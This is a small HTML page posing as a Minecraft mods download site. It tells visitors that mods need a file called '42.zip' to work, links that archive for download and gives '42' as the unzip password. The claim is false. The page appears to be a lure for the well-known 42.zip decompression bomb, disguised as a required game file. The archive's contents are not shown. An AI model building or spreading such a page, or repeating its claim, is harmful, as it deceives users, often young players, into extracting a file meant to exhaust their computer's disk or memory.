<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft Mods Download</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background-color: #2c2c2c;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            border: 2px solid #555;
            max-width: 500px;
        }
        h1 {
            color: #52c41a;
            font-size: 2.5rem;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2rem;
            line-height: 1.6;
            color: #dddddd;
            margin-bottom: 25px;
        }
        .highlight {
            background-color: #444;
            padding: 2px 8px;
            border-radius: 4px;
            font-family: monospace;
            color: #ff9c6e;
            font-weight: bold;
        }
        .btn {
            display: inline-block;
            background-color: #52c41a;
            color: white;
            text-decoration: none;
            padding: 12px 30px;
            font-size: 1.1rem;
            font-weight: bold;
            border-radius: 5px;
            transition: background-color 0.2s, transform 0.1s;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .btn:hover {
            background-color: #73d13d;
        }
        .btn:active {
            transform: scale(0.98);
        }
        .password-box {
            background-color: #1f1f1f;
            border: 1px dashed #ff4d4f;
            padding: 15px;
            border-radius: 6px;
            font-size: 1rem;
        }
        .password-text {
            font-family: monospace;
            font-size: 1.2rem;
            color: #ff4d4f;
            font-weight: bold;
            background-color: #331414;
            padding: 2px 8px;
            border-radius: 4px;
            margin-top: 5px;
            display: inline-block;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Minecraft Mods</h1>
        <p>Minecraft mods use <span class="highlight">42.zip</span> to function correctly.</p>
        
        <a href="42.zip" download class="btn">Download 42.zip</a>

        <div class="password-box">
            Password to unzip:
            <br>
            <span class="password-text">42</span>
        </div>
    </div>

</body>
</html>
